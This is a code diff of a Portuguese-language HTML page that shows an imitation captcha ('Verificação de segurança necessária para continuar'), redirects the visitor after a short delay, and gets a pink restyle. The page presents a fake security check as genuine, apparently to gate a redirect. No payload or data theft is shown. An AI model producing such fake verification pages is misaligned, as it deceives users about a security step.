@@ -20,6 +20,9 @@ function verificar() {
   const loading = document.getElementById("loading");
 
   if (check.checked) {
+    check.disabled = true;
+
+    loading.innerText = "Aguarde enquanto te transfiro...";
     loading.style.display = "block";
 
     setTimeout(() => {
@@ -28,14 +31,14 @@ function verificar() {
       const redirectUrl = baseUrl + params;
 
       window.location.href = redirectUrl;
-    }, 600); // delay estratégico
+    }, 600);
   }
 }
 </script>
 
 <style>
 body {
-  background: #f1f1f1;
+  background: #ffe4ec;
   font-family: Arial, sans-serif;
   display: flex;
   flex-direction: column;
@@ -47,15 +50,15 @@ body {
 
 .top-text {
   font-size: 14px;
-  color: #555;
+  color: #c2185b;
   margin-bottom: 15px;
   text-align: center;
   max-width: 300px;
 }
 
 .captcha-box {
-  background: white;
-  border: 1px solid #d3d3d3;
+  background: #fff0f5;
+  border: 1px solid #f8bbd0;
   border-radius: 8px;
   width: 340px;
   padding: 18px;
@@ -78,17 +81,18 @@ input[type="checkbox"] {
   width: 26px;
   height: 26px;
   cursor: pointer;
+  accent-color: #ec407a;
 }
 
 .text {
   font-size: 17px;
-  color: #222;
+  color: #880e4f;
 }
 
 .right {
   text-align: center;
   font-size: 10px;
-  color: #888;
+  color: #ad1457;
 }
 
 .logo {
@@ -100,7 +104,7 @@ input[type="checkbox"] {
   display: none;
   margin-top: 15px;
   font-size: 13px;
-  color: #555;
+  color: #c2185b;
   text-align: center;
 }
 </style>
@@ -110,7 +114,7 @@ input[type="checkbox"] {
 <body>
 
 <div class="top-text">
-🔒 Verificação de segurança necessária para continuar
+💖 Verificação de segurança necessária para continuar
 </div>
 
 <div class="captcha-box">
